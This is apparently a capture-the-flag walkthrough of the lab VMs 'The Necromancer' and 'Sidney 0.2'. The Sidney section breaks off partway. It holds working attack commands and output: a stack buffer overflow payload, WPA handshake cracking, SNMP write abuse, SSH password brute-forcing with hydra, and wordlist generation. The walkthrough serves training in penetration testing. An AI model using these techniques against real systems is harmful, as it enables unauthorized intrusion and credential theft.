192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 21448
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

```
On decoding the base64 string
```
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

Chant the string of flag1 is a important sentence, I was quite stupid, to just try HEX on the string. Whenever, we receive such string, it's better to identify it using hash-identifier, which identifies it as a MD5. Searching on google for this string, it results in opensesame. Chanting the string of opensesame on the UDP port 666
```
nc -u 192.168.56.101 666
e6078b9b1aac915d11b9fd59791030bf
Chant had no affect! Try in a different tongue!
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```
On rescanning the Necromancer VM, we found that a TCP port got open and UDP Port 666 closed
```
nmap -p- 192.168.56.101 -oA Necro3 -v

Nmap scan report for 192.168.56.101
Host is up (0.00038s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
```
On browsing port 80, a webpage opens with the text and a photograph
```
Hours have passed since you first started to follow the crows.

Silence continues to engulf you as you treck towards a mountain range on the horizon.

More times passes and you are now standing in front of a great chasm.

Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.

As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.

The necromancer looks towards you with hollow eyes which can only be described as death.

He smirks in your direction, and suddenly a bright light momentarily blinds you.

The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!

The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.

The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.

```
If we read the text, which we got on port 666, it says "you can see on of the crows is grasping on to an object" which I believe serves as an hint. on running file and string or binwalk on the image, we find a txt file is hidden in the image.

```
binwalk pileoffeathers.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> 
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```
Extracting the feathers.txt with 7z. It contains a base64 encoded string which provides the path
```
cat feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```
Following the trail at http://192.168.56.101/amagicbridgeappearsatthechasm/ we get another text
```
You cautiously make your way across chasm.

You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.

The cave before you is protected by some sort of spell cast by the necromancer.

You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.

Hastily you take a few steps back away from the cave entrance.

There must be a magical item that could protect you from the necromancer's spell.
```
Again, if you see the hint is provided "Magical item that could protect you from the necromancer's spell". We found this using rockyou or darkc0de wordlist

Running dirb with rockyou/ darc0de provides the 200 HTTP Code

Running file on it 
```
file talisman 
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
```
Executing it, it asks for a input
```
/talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  asfsaf

Nothing happens.
```
Using python print command to send a large number of characters to see if it crashes
```
python -c 'print "A" * 40' | ./talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.
Segmentation fault
```
Utilizing ulimit -c unlimited, pattern_create and pattern_offset to create a core dump and find the offset
```
ulimit -c unlimited

usr/share/metasploit-framework/ruby /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 | ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.



Segmentation fault (core dumped)
```
Using gdb to find the offset
```
gdb -c core -q
[New LWP 6619]
Core was generated by `./talisman'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x31624130 in ?? ()
(gdb) 
```
Utilizing pattern_offset to find the offset
```
/usr/share/metasploit-framework/ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31624130
[*] Exact match at offset 32
```

This could be confirmed by python 'A' * 32 + "BBBB".

using GDB to view all the functions
```
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x080482d0  _init
0x08048310  printf@plt
0x08048320  __libc_start_main@plt
0x08048330  __isoc99_scanf@plt
0x08048350  _start
0x08048380  __x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  __do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  __libc_csu_init
0x08049590  __libc_csu_fini
0x08049594  _fini
```
chantToBreakSpell seems interesting. Let's put the address of that function in the overflow pointer.
```
python -c 'print "A"*32 + "\x37\x8a\x04\x08"' | ./talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.



!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Segmentation fault (core dumped)
```
It suggests to connect to udp port 31337 and chant the words
```
nc -u 192.168.56.101 31337

Nothing happens.
blackmagic


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}

```
It provides another webpage link with a story and 
```
flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}

You continue to make your way through the cave.

In the distance you can see a familiar flicker of light moving in and out of the shadows. 

As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.

You move closer, and then stop frozen with fear.

It's the necromancer!


Image copyright: Manzanedo




Again he stares at you with deathly hollow eyes. 

He is standing in a doorway; a staff in one hand, and an object in the other. 

Smirking, the necromancer holds the staff and the object in the air.

He points his staff in your direction, and the stench of death and decay begins to fill the air.

You stare into his eyes and then.......








...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.

The amulet must have saved you from whatever spell the necromancer had cast.

You stand to your feet. Behind you, only darkness.

Before you, a large door with the symbol of a skull engraved into the surface. 

Looking closer at the skull, you can see u161 engraved into the forehead.
```
Running file
```
file necromancer 
necromancer: bzip2 compressed data, block size = 900k

tar -jxvf necromancer
necromancer.cap

file necromancer.cap 
necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
```
Opening the necromancer.cap file, we find Authentication, Deauthentication and EAPOL data, which is similar to the packet capture when trying to do WPA-handshake capture, while trying to deauthenticate the valid user.
```
13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
13:06:21.991250 Authentication (Open System)-1: Successful
13:06:21.992274 Authentication (Open System)-1: Successful
13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:21.992795 Authentication (Open System)-2: 
13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station

```

Aircrack-ng shows 1 WPA Handshake present
```
ircrack-ng necromancer.cap 
Opening necromancer.cap
Read 2197 packets.

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)

Choosing first network as target.

Opening necromancer.cap
Please specify a dictionary (option -w).

```
Utilizing aircrack with rockyou provides the wpa key
```
                                 Aircrack-ng 1.2 rc4

      [00:00:09] 16092/9822768 keys tested (1749.59 k/s) 

      Time left: 1 hour, 33 minutes, 27 seconds                  0.16%

                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
```

If we read the message previously, it says, u161 is engraved into your forehead. Using snmpwalk to findout.
```
snmp-check -t 192.168.56.101 -c death2all 

 [*] System information
 -----------------------------------------------------------------------------------------------

 Hostname               : Fear the Necromancer!
 Description            : You stand in front of a door.
 Uptime system          : 0.00 seconds
 Uptime SNMP daemon     : 0.00 seconds
 Contact                : The door is Locked. If you choose to defeat me, the door must be Unlocked.
 Location               : Locked - death2allrw!
 Motd                   : -
```
Checking for write access with death2all and death2allrw
```
snmp-check -t 192.168.56.101 -c death2all -w
snmpcheck v1.8 - SNMP enumerator
 [*] Try to connect to 192.168.56.101
 [*] Connected to 192.168.56.101
 [*] Starting enumeration at 2016-07-16 17:27:43
 [*] No write access enabled.
 [*] Checked 192.168.56.101 in 0.00 seconds


snmp-check -t 192.168.56.101 -c death2allrw -w
snmpcheck v1.8 - SNMP enumerator
Copyright (c) 2005-2011 by Matteo Cantoni (www.nothink.org)

 [*] Try to connect to 192.168.56.101
 [*] Connected to 192.168.56.101
 [*] Starting enumeration at 2016-07-16 17:27:55
 [*] Write access enabled!
 [*] Checked 192.168.56.101 in 0.00 seconds
```
Write access is enabled, we can use snmpset
```
snmpwalk -c death2all -v 1 192.168.56.101
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "HASH(0x286cfd0)"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
End of MIB
```
We need to change the iso.3.6.1.2.1.1.6.0 MIB from "Locked - death2allrw!" to "Unlocked"
```
snmpset -c death2allrw -v 1 192.168.56.101 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
```
Running snmpwalk again with community string death2all
```
snmpwalk -c death2all -v 1 192.168.56.101
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
```
Checking the google for 9e5494108d10bbd5f9e7ae52239546c4 leads to demonslayer, combined with the hint of t22 which is tcp 22/ ssh. we try to login using hydra and rockyou dictionary.
```
hydra -l demonslayer -P /tmp/rockyou.txt ssh://192.168.56.101
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-16 17:38:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.56.101   login: demonslayer   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-16 17:38:12
```
It provides the password superfast.

Loggin in to view another flag
```
$ id
uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
$ ls
flag8.txt
$ cat flag8.txt                                                                                                                                                                                                                 
You enter the Necromancer's Lair!

A stench of decay fills this place.  

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.  

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!" 

Defend yourself!  Counter attack the Necromancer's spells at u777!
```
On connecting the udp port 777 from the ssh session
```
$ nc -u localhost 777



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  Kelewan


flag8{55a6af2ca3fee9f2fef81d20743bda2c}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile
```
Finding the small vile with the ls -lah
```
cat .smallvile                                                                                                                                                                                                                


You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!



```
```
sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
$ sudo cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="

```
</li>
<li>Sidney 0.2:
Only port 80 is open
```
# Nmap 7.25BETA1 scan initiated Thu Jul 28 01:22:34 2016 as: nmap -p- -sV -A -oA Sidney -vv 192.168.1.3
Nmap scan report for 192.168.1.3
Host is up, received syn-ack (0.0099s latency).
Scanned at 2016-07-28 01:22:35 IST for 9s
Not shown: 65534 closed ports
Reason: 65534 conn-refused
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 38911 Bytes Free
```
On doing curl and exploring, we find a username and possible password in one of the webpage directory
```
curl 192.168.1.3/commodore64/
<title>Shoo!</title>
<!-- added by robhubbard password is the C=64 sound chip lowercase -->
<!-- 3letters4digits no space... Instead, show user a proper micro -->
<BODY>
Will you go away, I'm trying to press play on tape and you bother me kid!
<br></br>
<img src="200.gif" alt="commodore64" height="408" width="544">
</BODY>
```
If you see here, the password is the C=64 sound chip ( mos lowercase ) and then 4 digits. Now, we can generate the password using either for loop
```
for i in `seq -f "%04g" 0 9999`; do echo mos$i; done
```
or using crunch
```
crunch 7 7 -t mos%%%%
```
On running dirb we found a webpage containing the login prompt
```
---- Scanning URL: http://192.168.1.3/commodore64/ ----
+ http://192.168.1.3/commodore64// (CODE:200|SIZE:325)
+ http://192.168.1.3/commodore64/200 (CODE:200|SIZE:5548)
==> DIRECTORY: http://192.168.1.3/commodore64/conf/
==> DIRECTORY: http://192.168.1.3/commodore64/docs/
==> DIRECTORY: http://192.168.1.3/commodore64/icon/
==> DIRECTORY: http://192.168.1.3/commodore64/incl/
+ http://192.168.1.3/commodore64/index (CODE:200|SIZE:183)                                                                                                                                                                       
+ http://192.168.1.3/commodore64/index.html (CODE:200|SIZE:325)                                                                                                                                                                  
+ http://192.168.1.3/commodore64/index.php (CODE:200|SIZE:1841)                                                                                                                                                                  
==> DIRECTORY: http://192.168.1.3/commodore64/lang/                                                                                                                                                                              
+ http://192.168.1.3/commodore64/.php (CODE:403|SIZE:302)                                                                                                                                                                        
+ http://192.168.1.3/commodore64/.phtml (CODE:403|SIZE:304)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/readme (CODE:200|SIZE:2177)                                                                                                                                                                     
                                                                                                                                                                                                                                 
---- Entering directory: http://192.168.1.3/commodore64/conf/ ----
+ http://192.168.1.3/commodore64/conf// (CODE:403|SIZE:304)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/conf/.php (CODE:403|SIZE:307)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/conf/.phtml (CODE:403|SIZE:309)                                                                                                                                                                 
                                                                                                                                                                                                                                 
---- Entering directory: http://192.168.1.3/commodore64/docs/ ----
+ http://192.168.1.3/commodore64/docs// (CODE:403|SIZE:304)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/docs/changelog (CODE:200|SIZE:3115)                                                                                                                                                             
+ http://192.168.1.3/commodore64/docs/faq (CODE:200|SIZE:2255)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/docs/install (CODE:200|SIZE:2969)                                                                                                                                                               
+ http://192.168.1.3/commodore64/docs/license (CODE:200|SIZE:15515)                                                                                                                                                              
+ http://192.168.1.3/commodore64/docs/.php (CODE:403|SIZE:307)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/docs/.phtml (CODE:403|SIZE:309)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/docs/requirements (CODE:200|SIZE:668)                                                                                                                                                           
+ http://192.168.1.3/commodore64/docs/todo (CODE:200|SIZE:1154)                                                                                                                                                                  
                                                                                                                                                                                                                                 
---- Entering directory: http://192.168.1.3/commodore64/icon/ ----
+ http://192.168.1.3/commodore64/icon// (CODE:403|SIZE:304)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/icon/back (CODE:200|SIZE:996)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/icon/binary (CODE:200|SIZE:246)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/c (CODE:200|SIZE:242)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/icon/compressed (CODE:200|SIZE:1038)                                                                                                                                                            
+ http://192.168.1.3/commodore64/icon/delete (CODE:200|SIZE:929)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/download (CODE:200|SIZE:939)                                                                                                                                                               
+ http://192.168.1.3/commodore64/icon/drive (CODE:200|SIZE:246)                                                                                                                                                                  
+ http://192.168.1.3/commodore64/icon/edit (CODE:200|SIZE:941)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/icon/folder (CODE:200|SIZE:225)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/image2 (CODE:200|SIZE:309)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/layout (CODE:200|SIZE:276)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/logout (CODE:200|SIZE:989)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/movie (CODE:200|SIZE:243)                                                                                                                                                                  
+ http://192.168.1.3/commodore64/icon/newfolder (CODE:200|SIZE:1021)                                                                                                                                                             
+ http://192.168.1.3/commodore64/icon/next (CODE:200|SIZE:843)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/icon/original (CODE:200|SIZE:846)                                                                                                                                                               
+ http://192.168.1.3/commodore64/icon/.php (CODE:403|SIZE:307)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/icon/.phtml (CODE:403|SIZE:309)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/plus (CODE:200|SIZE:842)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/icon/previous (CODE:200|SIZE:844)                                                                                                                                                               
+ http://192.168.1.3/commodore64/icon/rename (CODE:200|SIZE:899)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/script (CODE:200|SIZE:242)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/text (CODE:200|SIZE:229)                                                                                                                                                                   
+ http://192.168.1.3/commodore64/icon/unknown (CODE:200|SIZE:245)                                                                                                                                                                
+ http://192.168.1.3/commodore64/icon/upload (CODE:200|SIZE:939)                                                                                                                                                                 
+ http://192.168.1.3/commodore64/icon/view (CODE:200|SIZE:929)                                                                                                                                                                   
                                                                                                                                                                                                                                 
---- Entering directory: http://192.168.1.3/commodore64/incl/ ----
+ http://192.168.1.3/commodore64/incl// (CODE:403|SIZE:304)                                                                                                                                                                      
+ http://192.168.1.3/commodore64/incl/.php (CODE:403|SIZE:307)                                                                                                                                                                   
